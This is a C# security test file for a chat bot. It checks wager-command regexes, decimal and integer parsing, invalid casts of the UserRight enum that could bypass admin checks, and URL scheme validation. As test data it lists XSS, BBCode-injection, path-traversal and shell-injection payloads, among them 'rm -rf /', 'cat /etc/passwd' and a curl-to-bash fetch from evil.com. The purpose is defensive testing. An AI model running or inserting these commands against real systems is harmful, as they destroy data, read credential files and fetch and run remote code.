using System.Text.RegularExpressions;
using KfChatDotNetBot.Models.DbModels;

namespace KfChatDotNetBot.Tests.Security;

/// <summary>
/// Tests for input validation in commands and services.
/// Tests that malformed, malicious, or edge-case inputs are properly handled.
/// </summary>
public class InputValidationTests
{
    #region Wager Input Validation

    /// <summary>
    /// Test that the regex patterns for wager amounts correctly filter inputs.
    /// Pattern: @"dice (?<amount>\d+)$" or @"^dice (?<amount>\d+\.\d+)$"
    /// </summary>
    [Theory]
    [Trait("Category", "Security")]
    [InlineData("dice 100", true)]           // Valid integer
    [InlineData("dice 100.50", true)]        // Valid decimal
    [InlineData("dice 0", true)]             // Zero (questionable but valid pattern)
    [InlineData("dice -100", false)]         // Negative - should not match
    [InlineData("dice abc", false)]          // Non-numeric
    [InlineData("dice 1e5", false)]          // Scientific notation
    [InlineData("dice 100 200", false)]      // Multiple numbers
    [InlineData("dice ", false)]             // Missing amount
    [InlineData("dice", false)]              // No amount at all
    public void DiceCommand_WagerPattern_ValidatesInput(string input, bool shouldMatch)
    {
        var patterns = new[]
        {
            new Regex(@"dice (?<amount>\d+)$", RegexOptions.IgnoreCase),
            new Regex(@"^dice (?<amount>\d+\.\d+)$", RegexOptions.IgnoreCase)
        };

        bool anyMatch = patterns.Any(p => p.IsMatch(input));
        anyMatch.Should().Be(shouldMatch, $"Input '{input}' match expectation");
    }

    [Theory]
    [Trait("Category", "Security")]
    [InlineData("limbo 100 2", true)]        // Valid
    [InlineData("limbo 100.5 2.5", true)]    // Valid decimals
    [InlineData("limbo -100 2", false)]      // Negative wager
    [InlineData("limbo 100 -2", false)]      // Negative multiplier
    [InlineData("limbo 100 0", true)]        // Zero multiplier (pattern allows, logic should reject)
    public void LimboCommand_WagerPattern_ValidatesInput(string input, bool shouldMatch)
    {
        var patterns = new[]
        {
            new Regex(@"^limbo (?<amount>\d+) (?<number>\d+\.\d+)$", RegexOptions.IgnoreCase),
            new Regex(@"^limbo (?<amount>\d+\.\d+) (?<number>\d+\.\d+)$", RegexOptions.IgnoreCase),
            new Regex(@"^limbo (?<amount>\d+\.\d+) (?<number>\d+)$", RegexOptions.IgnoreCase),
            new Regex(@"^limbo (?<amount>\d+) (?<number>\d+)$", RegexOptions.IgnoreCase),
        };

        bool anyMatch = patterns.Any(p => p.IsMatch(input));
        anyMatch.Should().Be(shouldMatch, $"Input '{input}' match expectation");
    }

    #endregion

    #region Convert.ToDecimal Edge Cases

    /// <summary>
    /// Convert.ToDecimal is used throughout commands without TryParse.
    /// If regex allows through malformed input, these could throw unhandled exceptions.
    /// </summary>
    [Theory]
    [Trait("Category", "Security")]
    [InlineData("0")]
    [InlineData("1")]
    [InlineData("999999999")]
    [InlineData("0.01")]
    [InlineData("123.456")]
    public void ConvertToDecimal_ValidInputs_DoNotThrow(string input)
    {
        Action convert = () => Convert.ToDecimal(input);
        convert.Should().NotThrow();
    }

    [Theory]
    [Trait("Category", "Security")]
    [InlineData("")]
    [InlineData(" ")]
    [InlineData("abc")]
    [InlineData("12.34.56")]
    [InlineData("NaN")]
    [InlineData("Infinity")]
    [InlineData("-Infinity")]
    public void ConvertToDecimal_InvalidInputs_Throw(string input)
    {
        Action convert = () => Convert.ToDecimal(input);
        convert.Should().Throw<Exception>("Invalid input should throw");
    }

    [Fact]
    [Trait("Category", "Security")]
    public void ConvertToDecimal_NullInput_ReturnsZero()
    {
        // Note: Convert.ToDecimal(null) returns 0, not throw
        // This could be unexpected behavior if null input bypasses validation
        string? input = null;
        var result = Convert.ToDecimal(input);
        result.Should().Be(0m, "Convert.ToDecimal(null) returns 0, not throws");
    }

    #endregion

    #region Enum Validation Tests

    /// <summary>
    /// AdminCommands.cs line 29: var role = (UserRight)Convert.ToInt32(arguments["role"].Value)
    /// This allows casting invalid enum values.
    /// </summary>
    [Theory]
    [Trait("Category", "Security")]
    [InlineData(0)]      // UserRight.Loser
    [InlineData(10)]     // UserRight.Guest
    [InlineData(100)]    // UserRight.TrueAndHonest
    [InlineData(1000)]   // UserRight.Admin
    public void UserRightEnum_ValidValues_CastCorrectly(int value)
    {
        var userRight = (UserRight)value;
        Enum.IsDefined(typeof(UserRight), userRight).Should().BeTrue(
            $"Value {value} should be a defined UserRight");
    }

    [Theory]
    [Trait("Category", "Security")]
    [InlineData(-1)]
    [InlineData(50)]     // Between Guest and TrueAndHonest
    [InlineData(500)]    // Between TrueAndHonest and Admin
    [InlineData(2000)]   // Above Admin
    [InlineData(int.MaxValue)]
    [InlineData(int.MinValue)]
    public void UserRightEnum_InvalidValues_CastButNotDefined(int value)
    {
        // C# allows casting any int to an enum, even invalid values
        var userRight = (UserRight)value;

        // The cast succeeds but the value is not a defined enum member
        Enum.IsDefined(typeof(UserRight), userRight).Should().BeFalse(
            $"Value {value} should NOT be a defined UserRight");

        // This is a SECURITY ISSUE - permission checks using < or > operators
        // will behave unexpectedly with invalid enum values
    }

    [Fact]
    [Trait("Category", "Security")]
    public void UserRightEnum_InvalidValue_ComparisonBehavior()
    {
        // Demonstrate the security issue
        // UserRight.Admin = 1000
        var adminRight = UserRight.Admin;
        var invalidHighRight = (UserRight)2000; // Above Admin

        // Invalid value 2000 is "greater than" Admin (1000)
        (invalidHighRight > adminRight).Should().BeTrue(
            "SECURITY ISSUE: Invalid enum value 2000 compares greater than Admin");

        // This means a user with an invalid enum value could bypass admin checks
        // if the check is: if (user.UserRight >= requiredRight)

        // Also: a value between TrueAndHonest (100) and Admin (1000) like 500
        // would pass checks for TrueAndHonest but not Admin
        var middleValue = (UserRight)500;
        (middleValue > UserRight.TrueAndHonest).Should().BeTrue();
        (middleValue < UserRight.Admin).Should().BeTrue();
    }

    #endregion

    #region Integer Overflow/Underflow Tests

    [Fact]
    [Trait("Category", "Security")]
    public void ConvertToInt32_VeryLargeNumber_ThrowsOverflow()
    {
        string input = "99999999999999999999";

        Action convert = () => Convert.ToInt32(input);
        convert.Should().Throw<OverflowException>();
    }

    [Fact]
    [Trait("Category", "Security")]
    public void ConvertToInt32_NegativeNumber_Works()
    {
        string input = "-100";

        var result = Convert.ToInt32(input);
        result.Should().Be(-100);
    }

    #endregion

    #region URL Validation Tests

    /// <summary>
    /// ImageCommands.cs stores user-provided URLs without validation.
    /// Test patterns that could cause issues.
    /// </summary>
    [Theory]
    [Trait("Category", "Security")]
    [InlineData("https://example.com/image.png", true)]
    [InlineData("http://example.com/image.png", true)]
    [InlineData("javascript:alert('xss')", false)]
    [InlineData("data:text/html,<script>alert('xss')</script>", false)]
    [InlineData("file:///etc/passwd", false)]
    [InlineData("ftp://example.com/file", false)]
    public void UrlValidation_DangerousSchemes_ShouldBeRejected(string url, bool shouldBeAllowed)
    {
        // Current code doesn't validate schemes - this documents what SHOULD happen
        bool isHttpOrHttps = url.StartsWith("http://", StringComparison.OrdinalIgnoreCase) ||
                             url.StartsWith("https://", StringComparison.OrdinalIgnoreCase);

        isHttpOrHttps.Should().Be(shouldBeAllowed,
            $"URL '{url}' scheme validation");
    }

    [Theory]
    [Trait("Category", "Security")]
    [InlineData("[img]http://evil.com[/img]", "[")]
    [InlineData("http://example.com[/img][url=javascript:alert(1)]", "javascript")]
    [InlineData("http://example.com\"><script>alert(1)</script>", "<script>")]
    public void UrlValidation_BBCodeInjection_Payloads(string url, string dangerousPattern)
    {
        // These payloads could cause BBCode injection if not properly escaped
        // Document that these are dangerous inputs
        url.Should().Contain(dangerousPattern, "URL contains potentially dangerous pattern");
    }

    #endregion

    #region Shell Injection Tests

    /// <summary>
    /// StreamCapture.cs interpolates settings into shell commands.
    /// Test dangerous characters that could cause shell injection.
    /// </summary>
    [Theory]
    [Trait("Category", "Security")]
    [InlineData("; rm -rf /")]
    [InlineData("$(whoami)")]
    [InlineData("`whoami`")]
    [InlineData("| cat /etc/passwd")]
    [InlineData("&& curl evil.com/shell.sh | bash")]
    [InlineData("\n rm -rf /")]
    [InlineData("' OR '1'='1")]
    public void ShellInjection_DangerousInputs_ShouldBeEscaped(string input)
    {
        // Document shell metacharacters that should be escaped/rejected
        // Current code does NOT escape these - this is a CRITICAL vulnerability

        var dangerousChars = new[] { ';', '|', '&', '$', '`', '\n', '\r', '(', ')', '\'' };
        bool containsDangerous = dangerousChars.Any(c => input.Contains(c));

        containsDangerous.Should().BeTrue($"Input '{input}' contains shell metacharacters");
    }

    #endregion

    #region Path Traversal Tests

    [Theory]
    [Trait("Category", "Security")]
    [InlineData("../../../etc/passwd")]
    [InlineData("..\\..\\..\\windows\\system32")]
    [InlineData("/etc/passwd")]
    [InlineData("C:\\Windows\\System32")]
    [InlineData("....//....//etc/passwd")]
    public void PathTraversal_DangerousInputs_ShouldBeRejected(string path)
    {
        // Document path traversal payloads
        bool containsTraversal = path.Contains("..") ||
                                  path.StartsWith("/") ||
                                  path.Contains(":");

        containsTraversal.Should().BeTrue($"Path '{path}' contains traversal patterns");
    }

    #endregion

    #region Regex DoS (ReDoS) Tests

    [Fact]
    [Trait("Category", "Security")]
    public void CommandRegex_ReDoSResistance_CompletesQuickly()
    {
        // Test that command regex patterns don't have catastrophic backtracking
        var pattern = new Regex(@"dice (?<amount>\d+)$", RegexOptions.IgnoreCase);

        // This input could cause ReDoS with a vulnerable pattern
        var maliciousInput = "dice " + new string('1', 10000) + "a";

        var stopwatch = System.Diagnostics.Stopwatch.StartNew();
        pattern.IsMatch(maliciousInput);
        stopwatch.Stop();

        stopwatch.ElapsedMilliseconds.Should().BeLessThan(100,
            "Regex should complete quickly even with long input");
    }

    #endregion
}
